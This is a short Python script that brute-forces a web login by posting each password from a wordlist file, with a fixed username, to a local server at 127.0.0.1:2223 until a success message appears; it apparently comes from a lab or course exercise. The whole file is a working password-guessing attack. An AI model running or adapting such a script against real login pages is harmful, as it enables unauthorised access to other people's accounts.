import requests

with open("Q2dictionary.txt", "r", encoding="utf-8") as file:
    passwords = file.read().splitlines()
    for password in passwords:
        data = {
            "username": "V_Tristyn54",
            "password": password,
            "submit": "submit"
        }
        try:
            response = requests.post("http://127.0.0.1:2223", data=data)
            print(password)
            if "You Logged In" in response.text:
                print(f"Login successful with password: {password}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")